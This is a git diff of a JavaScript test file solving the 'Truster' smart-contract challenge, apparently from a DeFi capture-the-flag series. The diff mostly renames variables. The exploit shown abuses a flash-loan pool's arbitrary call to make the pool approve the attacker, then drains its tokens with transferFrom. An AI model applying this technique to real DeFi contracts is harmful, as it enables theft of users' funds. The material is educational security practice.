@@ -45,31 +45,31 @@ describe('[Challenge] Truster', function () {
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
 
-        const AttackTrusterDeployer = await ethers.getContractFactory("AttackTruster", attacker);
-        const attackContract = await AttackTrusterDeployer.deploy(this.pool.address, this.token.address);
+        const AttackTrusterDeployer = await ethers.getContractFactory("AttackTruster", player);
+        const attackContract = await AttackTrusterDeployer.deploy(pool.address, token.address);
 
-        const attackToken = this.token.connect(attacker);
+        const attackToken = token.connect(player);
 
         const amount = 0;
-        const borrower = attacker.address;
-        const target = this.token.address;
+        const borrower = player.address;
+        const target = token.address;
 
         // Create the ABI to approve the attacker to spend the tokens in the pool
         const abi = ["function approve(address spender, uint256 amount)"]
         const iface = new ethers.utils.Interface(abi);
-        const data = iface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL])
+        const data = iface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL])
 
         await attackContract.attack(amount, borrower, target, data);
         
-        const allowance = await attackToken.allowance(this.pool.address, attacker.address);
-        const balance = await attackToken.balanceOf(attacker.address);
-        const poolBalance = await attackToken.balanceOf(this.pool.address);
+        const allowance = await attackToken.allowance(pool.address, player.address);
+        const balance = await attackToken.balanceOf(player.address);
+        const poolBalance = await attackToken.balanceOf(pool.address);
 
         console.log("Attacker balance:", balance.toString())
         console.log("Pool balance:", poolBalance.toString())
         console.log("Allowance:", allowance.toString());
 
-        await attackToken.transferFrom(this.pool.address, attacker.address, allowance);
+        await attackToken.transferFrom(pool.address, player.address, allowance);
 
     });
 
